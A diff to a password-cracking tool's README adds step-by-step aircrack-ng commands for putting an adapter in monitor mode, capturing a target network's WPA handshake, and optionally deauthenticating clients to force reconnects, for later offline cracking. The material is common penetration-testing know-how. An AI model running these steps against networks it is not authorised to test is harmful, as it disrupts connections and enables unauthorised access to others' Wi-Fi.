@@ -92,7 +92,74 @@ password-guesser crack-hash \
 
 Supported algorithms: `md5`, `sha1`, `sha256`, `sha512`, `bcrypt`
 
-### 4. Crack WiFi handshakes
+### 4. Capture a WiFi handshake
+
+Before cracking, you need a WPA/WPA2 4-way handshake captured in a `.cap` file. This requires a wireless adapter that supports monitor mode.
+
+**Install aircrack-ng:**
+
+```sh
+# macOS
+brew install aircrack-ng
+
+# Ubuntu/Debian
+sudo apt install aircrack-ng
+
+# Arch
+sudo pacman -S aircrack-ng
+```
+
+**Step 1 — Identify your wireless interface:**
+
+```sh
+airmon-ng
+```
+
+This lists available wireless interfaces (e.g. `wlan0`).
+
+**Step 2 — Enable monitor mode:**
+
+```sh
+sudo airmon-ng start wlan0
+```
+
+This creates a monitor-mode interface (typically `wlan0mon`). It may also kill interfering processes — follow any prompts.
+
+**Step 3 — Scan for networks:**
+
+```sh
+sudo airodump-ng wlan0mon
+```
+
+This shows nearby access points. Note the target's **BSSID** (MAC address) and **channel** (CH).
+
+**Step 4 — Capture the handshake:**
+
+```sh
+sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 --write capture wlan0mon
+```
+
+Replace `AA:BB:CC:DD:EE:FF` with the target BSSID and `6` with the target channel. This writes capture files including `capture-01.cap`.
+
+Wait until you see `WPA handshake: AA:BB:CC:DD:EE:FF` in the top-right corner. A handshake is captured when a client connects (or reconnects) to the network.
+
+**Step 5 — (Optional) Deauthenticate a client to force a reconnect:**
+
+In a separate terminal, send a deauth to speed up handshake capture:
+
+```sh
+sudo aireplay-ng --deauth 4 -a AA:BB:CC:DD:EE:FF wlan0mon
+```
+
+**Step 6 — Stop monitor mode when done:**
+
+```sh
+sudo airmon-ng stop wlan0mon
+```
+
+The resulting `.cap` file can be passed directly to `password-guesser crack-wifi`.
+
+### 5. Crack WiFi handshakes
 
 ```sh
 # Using aircrack-ng (default)
